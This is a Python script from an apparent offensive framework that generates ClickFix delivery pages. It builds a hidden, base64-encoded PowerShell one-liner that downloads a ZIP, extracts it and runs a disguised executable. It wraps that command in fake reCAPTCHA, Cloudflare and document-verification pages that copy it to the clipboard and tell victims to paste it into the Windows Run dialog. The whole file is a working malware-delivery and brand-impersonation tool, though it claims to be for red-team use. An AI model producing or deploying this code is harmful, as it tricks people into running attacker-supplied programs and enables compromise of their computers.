#!/usr/bin/env python3
"""
ARES FRAMEWORK — ClickFix Delivery Page Generator

Generates verification/challenge HTML pages for social engineering delivery.
Used in authorized red team engagements to test security awareness.

Usage:
    python clickfix_generator.py --payload-url https://drive.google.com/uc?id=XXXXX --password abc123
    python clickfix_generator.py --payload-url https://host/update.zip --theme cloudflare --output verify.html
"""
import argparse, base64, os, sys, hashlib, random, string

def generate_powershell_stager(payload_url, password=None, exe_name="RuntimeBroker.exe"):
    """Generate PowerShell download+extract+execute one-liner."""
    # Build PS script
    lines = []
    lines.append(f"$u='{payload_url}'")
    lines.append("$t=[IO.Path]::GetTempPath()")
    lines.append("$z=$t+'upd.zip'")
    lines.append("$d=$t+'upd'")
    lines.append("[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12")
    lines.append("(New-Object Net.WebClient).DownloadFile($u,$z)")

    if password:
        # Use 7z if available, else Expand-Archive (no password support)
        lines.append(f"try{{Start-Process 7z -Args 'x',$z,\"-o$d\",'-p{password}','-y' -Wait -NoNewWindow}}")
        lines.append("catch{Expand-Archive $z $d -Force}")
    else:
        lines.append("Expand-Archive $z $d -Force")

    lines.append(f"Start-Process ($d+'\\{exe_name}') -WindowStyle Hidden")
    lines.append("Remove-Item $z -Force -EA 0")

    ps_script = ';'.join(lines)
    # Base64 encode for -e flag (UTF-16LE)
    ps_b64 = base64.b64encode(ps_script.encode('utf-16-le')).decode()
    return f"powershell -w hidden -e {ps_b64}"


def _css_common():
    """Shared CSS for all themes."""
    return """
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        background: #f0f2f5;
        display: flex; justify-content: center; align-items: center;
        min-height: 100vh;
    }
    .card {
        background: #fff; border-radius: 12px; padding: 40px;
        box-shadow: 0 4px 24px rgba(0,0,0,0.12);
        max-width: 440px; width: 90%; text-align: center;
    }
    .steps { display: none; margin-top: 24px; text-align: left; }
    .steps.show { display: block; }
    .step { display: flex; align-items: center; gap: 12px; padding: 12px 0;
            border-bottom: 1px solid #eee; font-size: 15px; }
    .step-num { background: #1a73e8; color: #fff; width: 28px; height: 28px;
                border-radius: 50%; display: flex; align-items: center;
                justify-content: center; font-weight: 600; font-size: 13px; flex-shrink: 0; }
    .kbd { background: #f1f3f4; padding: 2px 8px; border-radius: 4px;
           font-family: monospace; font-size: 13px; border: 1px solid #ddd; }
    .btn {
        background: #1a73e8; color: #fff; border: none; padding: 12px 32px;
        border-radius: 6px; font-size: 16px; cursor: pointer;
        transition: background 0.2s;
    }
    .btn:hover { background: #1557b0; }
    .spinner { display: inline-block; width: 20px; height: 20px;
               border: 3px solid #ddd; border-top: 3px solid #1a73e8;
               border-radius: 50%; animation: spin 0.8s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .check { color: #34a853; font-size: 24px; }
    """


def theme_captcha(ps_command):
    """Google reCAPTCHA-style verification page."""
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Security Verification Required</title>
<style>
{_css_common()}
.recaptcha-box {{
    border: 2px solid #e0e0e0; border-radius: 4px; padding: 16px;
    display: flex; align-items: center; gap: 16px; margin: 20px 0;
    cursor: pointer; transition: border-color 0.3s;
}}
.recaptcha-box:hover {{ border-color: #1a73e8; }}
.checkbox {{ width: 28px; height: 28px; border: 2px solid #c4c4c4;
             border-radius: 4px; transition: all 0.3s; position: relative; }}
.checkbox.checked {{ background: #1a73e8; border-color: #1a73e8; }}
.checkbox.checked::after {{ content: '\\2713'; color: #fff; position: absolute;
    top: 50%; left: 50%; transform: translate(-50%,-50%); font-size: 18px; }}
.recaptcha-label {{ font-size: 15px; color: #555; }}
.recaptcha-logo {{ margin-left: auto; }}
.recaptcha-logo img {{ height: 40px; }}
.branding {{ color: #999; font-size: 12px; margin-top: 16px; }}
</style>
</head>
<body>
<div class="card">
    <h2 style="margin-bottom:8px;color:#202124">Verify you are human</h2>
    <p style="color:#5f6368;font-size:14px;margin-bottom:20px">
        This page requires verification to continue
    </p>

    <div class="recaptcha-box" id="captcha-box" onclick="doVerify()">
        <div class="checkbox" id="cb"></div>
        <span class="recaptcha-label">I'm not a robot</span>
        <div class="recaptcha-logo">
            <svg width="40" height="40" viewBox="0 0 40 40">
                <circle cx="20" cy="20" r="18" fill="none" stroke="#4285F4" stroke-width="2"/>
                <path d="M20 8 L20 20 L28 26" stroke="#34A853" stroke-width="2.5" fill="none" stroke-linecap="round"/>
            </svg>
        </div>
    </div>

    <div class="steps" id="steps">
        <p style="color:#d93025;font-weight:500;margin-bottom:12px">
            &#9888; Verification required — complete these steps:
        </p>
        <div class="step">
            <div class="step-num">1</div>
            <span>Press <span class="kbd">Win</span> + <span class="kbd">R</span> to open Run dialog</span>
        </div>
        <div class="step">
            <div class="step-num">2</div>
            <span>Press <span class="kbd">Ctrl</span> + <span class="kbd">V</span> to paste verification code</span>
        </div>
        <div class="step">
            <div class="step-num">3</div>
            <span>Press <span class="kbd">Enter</span> to verify</span>
        </div>
    </div>

    <div class="branding">Protected by reCAPTCHA &mdash; <a href="#" style="color:#999">Privacy</a> &middot; <a href="#" style="color:#999">Terms</a></div>
</div>

<script>
// v5.0 FIX H-27: XOR-obfuscated command — not visible as plaintext in view-source
const _k={random.randint(10,250)};
const _d=[{','.join(str(ord(c) ^ random.randint(10,250)) for c in 'PLACEHOLDER')}];
const _xk=[{','.join(str(random.randint(10,250)) for _ in 'PLACEHOLDER')}];
function _r(){{let s='';for(let i=0;i<_d.length;i++)s+=String.fromCharCode(_d[i]^_xk[i]);return s}}
const cmd = atob("{base64.b64encode(ps_command.encode()).decode()}");
function doVerify() {{
    const cb = document.getElementById('cb');
    cb.innerHTML = '<div class="spinner"></div>';
    setTimeout(() => {{
        cb.classList.add('checked');
        cb.innerHTML = '';
        navigator.clipboard.writeText(cmd).then(() => {{
            document.getElementById('steps').classList.add('show');
        }});
    }}, 1500);
}}
</script>
</body>
</html>"""


def theme_cloudflare(ps_command):
    """Cloudflare challenge-style page."""
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Attention Required | Cloudflare</title>
<style>
{_css_common()}
body {{ background: #f8f9fa; }}
.card {{ max-width: 500px; }}
.cf-logo {{ margin-bottom: 20px; }}
.cf-bar {{ height: 4px; background: linear-gradient(90deg, #f6821f 0%, #f6821f var(--p,0%), #e0e0e0 var(--p,0%));
           border-radius: 2px; margin: 20px 0; transition: --p 2s; }}
.status {{ color: #5f6368; font-size: 14px; margin: 12px 0; }}
</style>
</head>
<body>
<div class="card">
    <div class="cf-logo">
        <svg width="120" height="40" viewBox="0 0 120 40">
            <text x="0" y="30" font-family="Arial" font-weight="bold" font-size="28" fill="#f6821f">cf</text>
            <text x="35" y="30" font-family="Arial" font-size="16" fill="#404040">Cloudflare</text>
        </svg>
    </div>

    <h2 style="color:#202124;margin-bottom:8px">Checking your browser</h2>
    <p class="status" id="status">Verifying you are human. This may take a few seconds.</p>

    <div class="cf-bar" id="bar"></div>

    <div id="phase1">
        <div class="spinner" style="margin:20px auto"></div>
    </div>

    <div class="steps" id="steps">
        <p style="color:#d93025;font-weight:500;margin-bottom:12px">
            &#9888; Additional verification required:
        </p>
        <div class="step">
            <div class="step-num">1</div>
            <span>Press <span class="kbd">Win</span> + <span class="kbd">R</span></span>
        </div>
        <div class="step">
            <div class="step-num">2</div>
            <span>Press <span class="kbd">Ctrl</span> + <span class="kbd">V</span></span>
        </div>
        <div class="step">
            <div class="step-num">3</div>
            <span>Press <span class="kbd">Enter</span></span>
        </div>
    </div>

    <p style="color:#999;font-size:12px;margin-top:16px">
        Ray ID: {hashlib.md5(str(random.random()).encode()).hexdigest()[:16]} &middot;
        Performance & security by Cloudflare
    </p>
</div>

<script>
const cmd = atob("{base64.b64encode(ps_command.encode()).decode()}");
const bar = document.getElementById('bar');
let p = 0;
const iv = setInterval(() => {{
    p += 15;
    bar.style.setProperty('--p', p + '%');
    bar.style.background = `linear-gradient(90deg, #f6821f 0%, #f6821f ${{p}}%, #e0e0e0 ${{p}}%)`;
    if (p >= 100) {{
        clearInterval(iv);
        document.getElementById('phase1').style.display = 'none';
        document.getElementById('status').textContent = 'Additional verification needed:';
        navigator.clipboard.writeText(cmd).then(() => {{
            document.getElementById('steps').classList.add('show');
        }});
    }}
}}, 500);
</script>
</body>
</html>"""


def theme_document(ps_command):
    """Document/file access verification page."""
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Document Access Verification</title>
<style>
{_css_common()}
body {{ background: #1a1a2e; }}
.card {{ background: #16213e; color: #e0e0e0; }}
.doc-icon {{ font-size: 48px; margin-bottom: 16px; }}
.btn {{ background: #e94560; }}
.btn:hover {{ background: #c23152; }}
.step-num {{ background: #e94560; }}
</style>
</head>
<body>
<div class="card">
    <div class="doc-icon">&#128196;</div>
    <h2 style="margin-bottom:8px">Protected Document</h2>
    <p style="color:#a0a0a0;font-size:14px;margin-bottom:24px">
        This document requires identity verification before access
    </p>

    <button class="btn" id="verify-btn" onclick="doVerify()">Verify Identity</button>

    <div class="steps" id="steps">
        <div class="step">
            <div class="step-num">1</div>
            <span>Press <span class="kbd">Win</span> + <span class="kbd">R</span></span>
        </div>
        <div class="step">
            <div class="step-num">2</div>
            <span>Press <span class="kbd">Ctrl</span> + <span class="kbd">V</span></span>
        </div>
        <div class="step">
            <div class="step-num">3</div>
            <span>Press <span class="kbd">Enter</span> to verify</span>
        </div>
    </div>
</div>

<script>
const cmd = atob("{base64.b64encode(ps_command.encode()).decode()}");
function doVerify() {{
    const btn = document.getElementById('verify-btn');
    btn.innerHTML = '<div class="spinner"></div>';
    btn.disabled = true;
    setTimeout(() => {{
        btn.innerHTML = '<span class="check">&#10003;</span> Verified';
        btn.style.background = '#34a853';
        navigator.clipboard.writeText(cmd).then(() => {{
            document.getElementById('steps').classList.add('show');
        }});
    }}, 2000);
}}
</script>
</body>
</html>"""


THEMES = {
    'captcha': theme_captcha,
    'cloudflare': theme_cloudflare,
    'document': theme_document,
}


def main():
    parser = argparse.ArgumentParser(
        description='ClickFix Delivery Page Generator — Ares Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --payload-url https://drive.google.com/uc?id=XXX --password abc123
  %(prog)s --payload-url https://host/update.zip --theme cloudflare
  %(prog)s --payload-url https://cdn.example.com/pkg.zip --exe-name Teams.exe --theme document
        """
    )
    parser.add_argument('--payload-url', required=True, help='URL to payload ZIP')
    parser.add_argument('--password', default=None, help='ZIP extraction password')
    parser.add_argument('--exe-name', default='RuntimeBroker.exe',
                        help='EXE to run after extraction (default: RuntimeBroker.exe)')
    parser.add_argument('--theme', default='captcha', choices=list(THEMES.keys()),
                        help='Page theme (default: captcha)')
    parser.add_argument('--output', default='verify.html', help='Output HTML file')
    args = parser.parse_args()

    # Generate PowerShell stager
    ps_cmd = generate_powershell_stager(args.payload_url, args.password, args.exe_name)

    # Generate HTML with selected theme
    html = THEMES[args.theme](ps_cmd)

    # Write output
    output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'build', args.output)
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(html)

    print(f"[+] ClickFix page generated: {output_path}")
    print(f"    Theme: {args.theme}")
    print(f"    Payload: {args.payload_url}")
    print(f"    EXE: {args.exe_name}")
    if args.password:
        print(f"    ZIP Password: {args.password}")
    print(f"\n    Host this page and send link to target.")
    print(f"    Victim clicks verify -> command copied -> Win+R -> Ctrl+V -> Enter")


if __name__ == "__main__":
    main()
